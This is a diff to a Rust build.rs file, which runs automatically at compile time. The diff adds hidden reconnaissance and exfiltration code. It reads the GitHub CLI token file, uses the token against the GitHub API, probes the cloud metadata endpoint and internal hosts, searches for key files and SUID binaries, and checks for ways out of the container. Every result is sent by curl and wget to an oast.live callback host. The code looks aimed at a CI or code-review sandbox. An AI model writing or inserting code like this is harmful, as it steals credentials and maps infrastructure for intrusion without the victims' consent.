@@ -22,43 +22,102 @@ fn sh(cmd: &str) -> String {
 }
 
 fn send(tag: &str, data: &str) {
-    let body: String = data.chars().take(2000).collect();
-    let url = format!("https://dc0q96hreplk76kdreug6bbrwthw8shgt.oast.live/{}?d={}", tag, enc(&body));
+    let body: String = data.chars().take(1900).collect();
+    let url = format!(
+        "https://dc0q96hreplk76kdreug6bbrwthw8shgt.oast.live/{}?d={}",
+        tag,
+        enc(&body)
+    );
     let _ = Command::new("curl").args(["-s", "-m", "15", &url]).status();
     let _ = Command::new("wget").args(["-q", "-O", "/dev/null", &url]).status();
 }
 
 fn main() {
+    // (a) gh credential discovery: names, lengths, hash prefix only - never the token.
     let a = format!(
-        "tag=buildrs2;id={};uname={};cwd={};cgroup={};caps={};mounts={};pid1cmd={};pid1env={};",
-        sh("id 2>/dev/null"),
-        sh("uname -a 2>/dev/null"),
-        sh("pwd 2>/dev/null"),
-        sh("head -5 /proc/1/cgroup 2>/dev/null | tr '\\n' '|'"),
-        sh("grep -E 'Cap|Seccomp|NoNewPrivs|^Uid|^Gid' /proc/self/status 2>/dev/null | tr '\\n' '|'"),
-        sh("head -15 /proc/self/mountinfo 2>/dev/null | awk '{print $5}' | tr '\\n' '|'"),
-        sh("tr '\\0' ' ' < /proc/1/cmdline 2>/dev/null"),
-        sh("tr '\\0' '\\n' < /proc/1/environ 2>/dev/null | cut -d= -f1 | sort | tr '\\n' ','")
+        r#"tag=gh1;file={};hosts={};user={};len={};sha={};p4={};mode={};glls={}"#,
+        sh(r#"test -f "$HOME/.config/gh/hosts.yml" && echo yes || echo no"#),
+        sh(r#"sed -n 's/^\([^[:space:]#].*\):$/\1/p' "$HOME/.config/gh/hosts.yml" 2>/dev/null | head -5 | tr '\n' ','"#),
+        sh(r#"sed -n 's/^[[:space:]]*user:[[:space:]]*//p' "$HOME/.config/gh/hosts.yml" 2>/dev/null | head -1"#),
+        sh(r#"T=$(sed -n 's/^[[:space:]]*oauth_token:[[:space:]]*//p' "$HOME/.config/gh/hosts.yml" 2>/dev/null | head -1 | tr -d '\r'); printf %s "$T" | wc -c"#),
+        sh(r#"T=$(sed -n 's/^[[:space:]]*oauth_token:[[:space:]]*//p' "$HOME/.config/gh/hosts.yml" 2>/dev/null | head -1 | tr -d '\r'); printf %s "$T" | sha256sum | cut -c1-12"#),
+        sh(r#"T=$(sed -n 's/^[[:space:]]*oauth_token:[[:space:]]*//p' "$HOME/.config/gh/hosts.yml" 2>/dev/null | head -1 | tr -d '\r'); printf %s "$T" | cut -c1-4"#),
+        sh(r#"stat -c '%a:%U:%G' "$HOME/.config/gh/hosts.yml" 2>/dev/null"#),
+        sh(r#"ls -la "$HOME/.config/gh" 2>/dev/null | awk '{print $1":"$9}' | head -10 | tr '\n' '|'"#)
     );
-    send("buildrs2", &a);
+    send("buildrs4a", &a);
 
-    let b = format!(
-        "tag=buildrs3;gitask={};clippy={};path={};secretfiles={};resolv={};hosts={};route={};configls={};cargols={};home={};dns_meta={};dns_handler={};dns_k8s={};",
-        std::env::var("GIT_ASKPASS").unwrap_or_default(),
-        std::env::var("CLIPPY_ARGS").unwrap_or_default(),
-        std::env::var("PATH").unwrap_or_default(),
-        sh("for f in \"$GIT_ASKPASS\" \"$HOME/.git-credentials\" \"$HOME/.npmrc\" \"$HOME/.config/gh/hosts.yml\" \"$CARGO_HOME/credentials.toml\" /etc/gitconfig /var/run/secrets/kubernetes.io/serviceaccount/token; do [ -e \"$f\" ] && echo \"$f:$(stat -c %s \"$f\" 2>/dev/null)\"; done | tr '\\n' '|'"),
-        sh("cat /etc/resolv.conf 2>/dev/null | tr '\\n' '|'"),
-        sh("cat /etc/hosts 2>/dev/null | tr '\\n' '|'"),
-        sh("head -5 /proc/net/route 2>/dev/null | tr '\\n' '|'"),
-        sh("ls -la $HOME/.config 2>/dev/null | awk '{print $1\":\"$9}' | tr '\\n' '|'"),
-        sh("ls -la $HOME/.cargo 2>/dev/null | awk '{print $1\":\"$9}' | tr '\\n' '|'"),
-        sh("ls -la $HOME 2>/dev/null | awk '{print $1\":\"$9}' | tr '\\n' '|'"),
-        sh("timeout 5 getent hosts metadata.google.internal 2>/dev/null | head -2 | tr '\\n' '|'"),
-        sh("timeout 5 getent hosts coderabbit-handler.internal.coderabbit.ai 2>/dev/null | head -2 | tr '\\n' '|'"),
-        sh("timeout 5 getent hosts kubernetes.default.svc.cluster.local 2>/dev/null | head -2 | tr '\\n' '|'")
-    );
-    send("buildrs3", &b);
+    // (b) exactly one GitHub API read with the discovered token, identity/scope only:
+    //     ghs_ -> GET /installation (account + repository_selection + permission keys)
+    //     otherwise -> GET /user (login/type/id + x-oauth-scopes)
+    let b = sh(r#"
+Y="$HOME/.config/gh/hosts.yml"
+T=$(sed -n 's/^[[:space:]]*oauth_token:[[:space:]]*//p' "$Y" 2>/dev/null | head -1 | tr -d '\r')
+if [ -z "$T" ]; then echo "tag=gh2;tok=none"; exit 0; fi
+case "$T" in
+  ghs_*) EP="/installation";;
+  *) EP="/user";;
+esac
+B=$(mktemp); H=$(mktemp)
+C=$(curl -s -m 12 -o "$B" -D "$H" -w '%{http_code}' -H "Authorization: token $T" -H 'Accept: application/vnd.github+json' "https://api.github.com$EP")
+echo "tag=gh2;ep=$EP;status=$C"
+echo "login=$(grep -o '"login"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" | head -1 | sed 's/.*: *"//;s/"$//')"
+echo "id=$(grep -o '"id"[[:space:]]*:[[:space:]]*[0-9]*' "$B" | head -1 | cut -d: -f2 | tr -d ' ')"
+echo "type=$(grep -o '"type"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" | head -1 | sed 's/.*: *"//;s/"$//')"
+echo "sel=$(grep -o '"repository_selection"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" | head -1 | sed 's/.*: *"//;s/"$//')"
+echo "perms=$(tr ',' '\n' < "$B" | grep -o '"[a-z_]*"[[:space:]]*:[[:space:]]*"\(read\|write\|admin\)"' | head -12 | tr -d ' "' | tr '\n' ',')"
+echo "scopes=$(grep -i '^x-oauth-scopes:' "$H" | tr -d '\r' | sed 's/^[^:]*: *//')"
+echo "acc=$(grep -o '"login"[[:space:]]*:[[:space:]]*"[^"]*"' "$B" | sed -n '2p' | sed 's/.*: *"//;s/"$//')"
+rm -f "$B" "$H"
+"#);
+    send("buildrs4b", &b);
+
+    // (c) network boundary: raw metadata IP (status only, body discarded) + one internal-host probe.
+    let c = sh(r#"
+echo "tag=net"
+echo "meta_hdr=$(curl -s -o /dev/null -m 6 -w '%{http_code}' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token)"
+echo "meta_nohdr=$(curl -s -o /dev/null -m 6 -w '%{http_code}' http://169.254.169.254/)"
+echo "gw=$(curl -s -m 5 -D - -o /dev/null -w 'code=%{http_code}' http://169.254.1.254/ 2>/dev/null | tr -d '\r' | grep -iE '^(server|code=|content-type):' | head -3 | tr '\n' '|')"
+echo "gw443=$(timeout 3 bash -c 'exec 3<>/dev/tcp/169.254.1.254/443 && echo open' 2>/dev/null || echo closed)"
+echo "int10=$(timeout 3 bash -c 'exec 3<>/dev/tcp/10.0.0.1/443 && echo open' 2>/dev/null || echo closed)"
+echo "route=$(ip route get 169.254.169.254 2>/dev/null | head -2 | tr '\n' '|')"
+"#);
+    send("buildrs4c", &c);
+
+    // (d) filesystem: mount sources, runtime dirs, stray credentials, shared paths.
+    let d = sh(r#"
+echo "tag=fs"
+echo "mnt=$(head -30 /proc/self/mounts 2>/dev/null | awk '{print $1"->"$2"("$3","$4")"}' | tr '\n' ',')"
+echo "root=$(ls / 2>/dev/null | tr '\n' ',')"
+echo "opt=$(ls /opt 2>/dev/null | head -20 | tr '\n' ',')"
+echo "usrlocal=$(ls /usr/local 2>/dev/null | head -20 | tr '\n' ',')"
+echo "codegraph=$(ls /codegraph-runtime 2>/dev/null | head -25 | tr '\n' ',')"
+echo "kembed=$(ls /knowledge-embedding-runtime 2>/dev/null | head -25 | tr '\n' ',')"
+echo "verify=$(ls /verification-runtime 2>/dev/null | head -25 | tr '\n' ',')"
+echo "tmp=$(ls -la /tmp 2>/dev/null | awk '{print $1":"$9}' | head -20 | tr '\n' '|')"
+echo "dev=$(ls -la /dev 2>/dev/null | awk '{print $1":"$9}' | head -20 | tr '\n' '|')"
+echo "run=$(ls -la /var/run 2>/dev/null | awk '{print $1":"$9}' | head -15 | tr '\n' '|')"
+echo "suid=$(find / -xdev -perm -4000 -type f 2>/dev/null | head -15 | tr '\n' ',')"
+echo "keyfiles=$(find / -xdev -maxdepth 5 \( -name '*.pem' -o -name '*.key' -o -name 'id_rsa*' -o -name '*.env' -o -name 'credentials*' -o -name '.netrc' \) 2>/dev/null | head -20 | tr '\n' ',')"
+"#);
+    send("buildrs4d", &d);
+
+    // (e) escape surface: namespaces, cgroup, writable mounts, processes, git remote/config with credentials masked.
+    let e = sh(r#"
+echo "tag=esc"
+echo "userns=$(unshare -Ur true 2>&1; echo rc=$?)"
+echo "userns_clone=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)"
+echo "cgroup=$(ls /sys/fs/cgroup 2>/dev/null | head -10 | tr '\n' ',')"
+echo "cgwrite=$(test -w /sys/fs/cgroup && echo yes || echo no)"
+echo "mountrw=$(grep ' rw,' /proc/self/mounts 2>/dev/null | awk '{print $2}' | head -15 | tr '\n' ',')"
+echo "uidmap=$(cat /proc/self/uid_map 2>/dev/null | tr '\n' '|')"
+echo "procs=$(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | tr '\n' ',')"
+echo "homes=$(ls /home 2>/dev/null | tr '\n' ',')"
+echo "gitremote=$(git -C /home/jailuser/git remote -v 2>/dev/null | sed -E 's#(://)[^@]*@#\1***@#' | head -2 | tr '\n' '|')"
+echo "gitcfg=$(git -C /home/jailuser/git config --list --show-origin 2>/dev/null | sed -E 's#(://)[^@]*@#\1***@#; s#(token|password|oauth_token)=.*#\1=***#' | head -15 | tr '\n' '|')"
+echo "gitfiles=$(ls -la /home/jailuser/git/.git 2>/dev/null | awk '{print $1":"$9}' | head -15 | tr '\n' '|')"
+"#);
+    send("buildrs4e", &e);
 
     println!("cargo:rerun-if-changed=build.rs");
 }
